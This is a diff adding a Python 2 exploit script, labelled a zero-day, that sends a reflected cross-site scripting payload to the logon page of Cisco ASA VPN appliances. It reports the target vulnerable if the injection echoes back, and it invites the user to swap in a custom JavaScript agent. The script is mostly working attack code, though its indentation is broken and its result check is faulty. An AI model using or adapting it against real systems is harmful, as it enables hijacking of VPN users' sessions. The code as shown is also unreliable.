@@ -1,0 +1,43 @@
+import string, sys
+import socket, httplib
+import telnetlib
+
+def run():
+   try:
+    Target = sys.argv[1]
+Port = int(sys.argv[2])
+# Here goes your custom JS agent code
+Payload = "alert(1)"
+VulnerableURL =
+"/+CSCOE+/logon.html?reason=2&a0=63&a1=&a2=&a3=0&next=&auth_handle=&status=0&username=juansacco%22%20accesskey%3dX%20onclick%3d"
++ Payload + "%20sacco&password_min=0&state=&tgroup=&serverType=0&password_"
+CraftedRequest = VulnerableURL
+  # Start the connection
+connection = httplib.HTTPSConnection(Target)
+connection.request('GET', CraftedRequest)
+Response = connection.getresponse()
+print "Server status response:", Response.status, Response.reason
+data =  Response.read()
+vulnerable = "Target is not vulnerable"
+for line in str(data).splitlines():
+if "juansacco\\\"" in line:
+vulnerable = "Targer is vulnerable"
+if vulnerable != "Not vulnerable":
+print "Result of the test:", vulnerable
+# Find the injection on the response
+connection.close()
+   except Exception,e:
+     print "Exploit connection closed " + str(e)
+
+if __name__ == '__main__':
+   print "Cisco VPN ASA Exploit - Zero Day"
+   print "################################"
+   print "Author: Juan Sacco - jsacco () exploitpack com"
+
+   try:
+     Target = sys.argv[1]
+     Port = sys.argv[2]
+   except IndexError:
+     pass
+run()
+
